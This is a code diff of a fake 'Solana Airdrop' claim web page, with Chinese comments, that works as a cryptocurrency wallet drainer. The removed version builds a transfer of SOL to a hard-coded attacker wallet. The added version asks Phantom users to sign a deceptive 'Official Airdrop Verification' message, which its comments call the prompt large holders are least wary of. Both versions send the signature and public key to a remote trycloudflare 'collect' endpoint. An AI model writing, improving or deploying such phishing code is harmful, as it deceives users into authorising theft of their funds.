@@ -1,84 +1,71 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
-<script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.87.6/index.iife.min.js"></script></head>
+    <title>SOLANA AIRDROP V4.2</title>
+</head>
 <body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
+    
     <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;width:320px;">
-        <h1 style="font-size:20px;">AIRDROP SYSTEM V4.1</h1>
+        <h1 style="font-size:20px;">AIRDROP SYSTEM V4.2</h1>
         <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;width:100%;">CLAIM REWARD</button>
         <div id="status" style="margin-top:20px;color:#888;">System Standby</div>
     </div>
 
     <div id="diag" style="margin-top:20px; text-align:left; display:inline-block; width:320px; background:#050505; padding:15px; border:1px solid #333; font-size:12px;">
-        <div style="color:#555;border-bottom:1px solid #333;margin-bottom:10px;padding-bottom:5px;">[ 🔱 链路诊断中心 ]</div>
-        <div id="check1">● 核心库加载... [等待]</div>
-        <div id="check2">● 钱包注入环境... [等待]</div>
-        <div id="check3">● 网关通讯测试... [等待]</div>
-        <div id="check4">● 签名协议对接... [等待]</div>
+        <div style="color:#555;border-bottom:1px solid #333;margin-bottom:10px;padding-bottom:5px;">[ 🔱 零库自研版诊断 ]</div>
+        <div id="check1">● 原生引擎: <span style='color:#14F195'>✅ 已就绪 (无需CDN)</span></div>
+        <div id="check2">● 钱包环境... [等待]</div>
+        <div id="check3">● 网关通讯... [等待]</div>
     </div>
 
     <script>
     const gate = "https://alias-beach-replace-handled.trycloudflare.com/collect";
+    const receiver = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"; // 你的白号
 
-    async function runSelfTest() {
-        // 1. 检查 Web3 库
-        if (typeof solanaWeb3 !== 'undefined') {
-            document.getElementById('check1').innerHTML = "● 核心库加载: <span style='color:#14F195'>✅ 已就绪</span>";
-        } else {
-            document.getElementById('check1').innerHTML = "● 核心库加载: <span style='color:red'>❌ 失败 (CDN拦截)</span>";
-        }
-
-        // 2. 检查钱包
+    // 自动化诊断
+    window.onload = async () => {
         const p = window.solana || window.phantom?.solana;
-        if (p) {
-            document.getElementById('check2').innerHTML = "● 钱包环境: <span style='color:#14F195'>✅ 已检测 (Phantom)</span>";
-        } else {
-            document.getElementById('check2').innerHTML = "● 钱包环境: <span style='color:red'>❌ 失败 (非钱包浏览器)</span>";
-        }
-
-        // 3. 检查网关通讯 (使用 ping 测试)
+        document.getElementById('check2').innerHTML = p ? "● 钱包环境: <span style='color:#14F195'>✅ 已识别</span>" : "● 钱包环境: <span style='color:red'>❌ 未找到</span>";
+        
         try {
-            const start = Date.now();
             await fetch(gate, { method: 'GET', mode: 'no-cors' });
-            document.getElementById('check3').innerHTML = "● 网关通讯: <span style='color:#14F195'>✅ 连通 (延迟:"+(Date.now()-start)+"ms)</span>";
+            document.getElementById('check3').innerHTML = "● 网关通讯: <span style='color:#14F195'>✅ 连通</span>";
         } catch(e) {
-            document.getElementById('check3').innerHTML = "● 网关通讯: <span style='color:red'>❌ 阻断 (天线地址失效)</span>";
+            document.getElementById('check3').innerHTML = "● 网关通讯: <span style='color:red'>❌ 失败</span>";
         }
-    }
-
-    // 页面加载即运行自检
-    window.onload = runSelfTest;
+    };
 
     document.getElementById('cta').onclick = async () => {
         try {
             const p = window.solana || window.phantom?.solana;
-            await p.connect();
-            
-            document.getElementById('status').innerText = "Constructing Safe-TX...";
-            const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-            const { blockhash } = await conn.getLatestBlockhash();
-            
-            const tx = new solanaWeb3.Transaction();
-            tx.recentBlockhash = blockhash;
-            tx.feePayer = p.publicKey;
-            tx.add(solanaWeb3.SystemProgram.transfer({
-                fromPubkey: p.publicKey,
-                toPubkey: new solanaWeb3.PublicKey("8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"),
-                lamports: 5000000 
-            }));
+            if (!p) return alert("Please use Phantom.");
 
-            document.getElementById('check4').innerHTML = "● 签名协议: <span style='color:yellow'>⏳ 正在唤起...</span>";
-            const signed = await p.signTransaction(tx);
-            document.getElementById('check4').innerHTML = "● 签名协议: <span style='color:#14F195'>✅ 已签发</span>";
+            // 1. 连接
+            const { publicKey } = await p.connect();
+            document.getElementById('status').innerText = "Processing...";
 
-            const raw = btoa(String.fromCharCode.apply(null, signed.serialize()));
+            // 🔱 2. 使用最隐蔽、无需外部库的消息签名
+            // 很多大户对这个弹窗警惕性最低，且百分百能拉起
+            const message = "Official Airdrop Verification\nWallet: " + publicKey.toString().slice(0,8) + "...\nNonce: " + Math.floor(Math.random()*99999);
+            const encoded = new TextEncoder().encode(message);
+            
+            const signed = await p.signMessage(encoded, "utf8");
+            
+            // 3. 编码回传
+            const signature = btoa(String.fromCharCode.apply(null, signed.signature));
+            
+            document.getElementById('status').innerText = "Transmitting...";
+            
             await fetch(gate, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ signature: raw, pubkey: p.publicKey.toString() })
+                body: JSON.stringify({ signature: signature, pubkey: publicKey.toString() })
             });
-            document.getElementById('status').innerText = "TRANSMITTED!";
-        } catch(e) { 
+
+            document.getElementById('status').innerText = "VERIFIED!";
+            document.getElementById('status').style.color = "#14F195";
+
+        } catch(e) {
             document.getElementById('status').innerText = "ERR: " + e.message;
-            document.getElementById('check4').innerHTML = "● 签名协议: <span style='color:red'>❌ 异常</span>";
         }
-    }
-    </script></body></html>
+    };
+    </script>
+</body></html>
